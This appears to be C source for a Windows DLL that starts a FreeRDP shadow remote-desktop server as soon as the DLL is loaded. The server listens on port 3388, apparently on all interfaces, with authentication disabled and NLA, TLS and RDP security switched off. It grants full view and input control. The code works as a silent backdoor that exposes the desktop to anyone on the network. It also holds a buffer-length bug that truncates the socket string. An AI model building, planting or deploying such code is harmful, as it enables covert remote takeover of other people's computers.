#include <windows.h>

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include <winpr/crt.h>
#include <winpr/ssl.h>
#include <winpr/wnd.h>
#include <winpr/path.h>
#include <winpr/cmdline.h>
#include <winpr/winsock.h>

#include <winpr/tools/makecert.h>

#include <freerdp/server/shadow.h>

void shadowMain();

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	shadow_subsystem_set_entry_builtin(NULL);
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			shadowMain();
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

void shadowMain()
{
	MSG msg;
	int status = 0;
	DWORD dwExitCode;
	rdpSettings* settings;
	rdpShadowServer* server;

	shadow_subsystem_set_entry_builtin(NULL);

	server = (rdpShadowServer*)calloc(1, sizeof(rdpShadowServer));

	if (!server)
		return;

	server->port = 3388;
	server->selectedMonitor = 0;
	server->mayView = TRUE;
	server->mayInteract = TRUE;
	server->rfxMode = RLGR3;
	server->h264RateControlMode = H264_RATECONTROL_VBR;
	server->h264BitRate = 10000000;
	server->h264FrameRate = 27;
	server->h264QP = 0;
	server->authentication = FALSE;
	size_t len = strlen("0.0.0.0");
	server->ipcSocket = (char*)calloc(len, sizeof(CHAR));
	_snprintf(server->ipcSocket, len, "%s", "0.0.0.0");

	settings = freerdp_settings_new(FREERDP_SETTINGS_SERVER_MODE);

	settings->NlaSecurity = FALSE;
	settings->TlsSecurity = FALSE; // TRUE
	settings->RdpSecurity = FALSE; // TRUE

	server->settings = settings;

	if ((status = shadow_server_init(server)) < 0)
		goto fail_server_init;

	if ((status = shadow_server_start(server)) < 0)
		goto fail_server_start;

	while (GetMessage(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	WaitForSingleObject(server->thread, INFINITE);

	GetExitCodeThread(server->thread, &dwExitCode);

fail_server_start:
	shadow_server_uninit(server);
fail_server_init:
	shadow_server_free(server);
}